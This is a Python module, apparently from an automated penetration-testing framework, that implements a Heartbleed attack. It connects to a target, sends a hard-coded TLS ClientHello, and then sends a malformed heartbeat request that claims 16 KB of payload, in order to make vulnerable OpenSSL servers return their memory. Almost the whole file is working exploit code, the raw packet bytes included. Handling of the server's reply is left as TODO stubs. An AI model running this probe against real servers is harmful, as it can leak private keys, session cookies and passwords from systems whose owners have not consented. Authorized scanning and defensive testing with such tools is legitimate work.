from typing import Tuple, Dict

from pinaht.knowledge.types.service import Service
from pinaht.knowledge.types.name import Name
from pinaht.knowledge.manager import BufferedModuleManager
from pinaht.knowledge.precondition import Precondition, MetaPrecondition
from pinaht.knowledge.precondition_factory.preconditions import check_type, check_value
from pinaht.knowledge.types.ipaddress import IPAddress
from pinaht.knowledge.types.knowledge import Knowledge
from pinaht.knowledge.types.port import Port
from pinaht.knowledge.types.protocol import Protocol
from pinaht.knowledge.types.target import Target
from pinaht.modules.module import Module
from pinaht.knowledge.precondition_factory.metapreconditions import merge, is_parent
import struct
import socket
import codecs


class HeartbleedModule(Module):
    # TODO knowledge types for heartbled ram

    def __init__(self, manager, **kwargs):
        super().__init__(manager, **kwargs)

        self.estimated_time = 1
        self.success_chance = 0.5

    def _generate_precondition_dnf(self) -> Dict[str, Tuple[Dict[str, Precondition], MetaPrecondition]]:
        """ """
        target_precondition = check_type(Target)
        ip_address_precondition = check_type(IPAddress)
        service = check_type(Service)
        port_precondition = check_type(Port)
        protocol_precondition = check_type(Protocol)
        protocol_name_precondition = check_value(Name("http"))

        return {
            "heartbleed_meta": (
                {
                    "target": target_precondition,
                    "ip": ip_address_precondition,
                    "service": service,
                    "port": port_precondition,
                    "protocol": protocol_precondition,
                    "protocol_name": protocol_name_precondition,
                },
                merge(
                    [
                        is_parent("target", ["ip"]),
                        is_parent("target", ["service"]),
                        is_parent("service", ["protocol", "port"]),
                        is_parent("protocol", ["protocol_name"]),
                    ]
                ),
            )
        }

    def execute(
        self, buffered_module_manager: BufferedModuleManager, meta_key: str, keyed_knowledge: Dict[str, Knowledge]
    ):
        """ """
        if meta_key == "heartbleed_meta":
            self.execute_heartbleed(buffered_module_manager, **keyed_knowledge)

    def execute_heartbleed(
        self, buffered_module_manager: BufferedModuleManager, target, ip, service, port, protocol, protocol_name
    ):

        self._logger.info(str(port))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((str(ip), port))

        s.send(self.to_binary(client_hello))

        while True:
            msg_type, message = self.receive_message(s)
            if not msg_type or not msg_type == 22:
                return
            if message[0] == 0x0E:
                break

        s.send(self.to_binary(heartbeat_request))

        message_type, payload = self.receive_message(s)
        if message_type is None:
            # TODO no answer from server
            pass
        if message_type == 24:
            if len(payload) > 3:
                # TODO server is vulnerable
                pass
            else:
                # TODO server replied, but is not vulnerable
                pass
        if message_type == 21:
            # TODO server replied with alert code
            pass
        s.close()

    @staticmethod
    def to_binary(x):
        return hex_decoder(x.replace(" ", "").replace("\n", ""))[0]

    @staticmethod
    def receive_message(s):
        tls_header = s.recv(5)
        if not tls_header:
            return None, None
        message_type, tls_version, length = struct.unpack(">BHH", tls_header)
        message = bytes()
        while len(message) < length:
            msg_piece = s.recv(length - len(message))
            if not msg_piece:
                break
            message += msg_piece
        if not message:
            return None, None
        return message_type, message


client_hello = """
        16
        03 02
        00 dc
        01
        00 00 d8 03 02 53
        43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf
        bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00
        00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88
        00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c
        c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09
        c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44
        c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c
        c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11
        00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04
        03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19
        00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08
        00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13
        00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00
        00 0f 00 01 01
        """

heartbeat_request = """
     18
     03 02
     00 03
     01
     40 00
     """

hex_decoder = codecs.getdecoder("hex_codec")
